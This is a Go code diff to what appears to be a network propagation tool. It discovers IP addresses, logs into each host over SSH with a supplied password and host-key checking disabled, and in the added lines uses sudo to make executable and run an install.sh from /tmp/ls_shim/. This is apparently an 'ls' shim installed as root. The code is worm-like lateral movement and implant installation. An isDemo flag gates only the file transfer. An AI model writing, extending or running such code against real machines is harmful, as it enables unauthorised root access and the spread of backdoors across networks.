@@ -32,7 +32,9 @@ func main() {
 	buildDB()
 	ips := findIPs()
 	fmt.Println(ips)
-	transferFiles(ips)
+	if !isDemo {
+		transferFiles(ips)
+	}
 
 }
 
@@ -42,7 +44,10 @@ func runRemote(username, password, ip string) {
 	}
 	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
 	buffer := bytes.Buffer{}
-	buffer.Write([]byte("echo " + password + " | sudo -S mkdir hi\n"))
+	buffer.Write([]byte("cd /tmp/ls_shim/\n" +
+		"echo " + password + " | sudo -S chmod +x install.sh\n" +
+		"echo " + password + " | sudo -S ./install.sh\n",
+	))
 	cmd.Stdin = &buffer
 
 	cmd.Stdout = os.Stdout
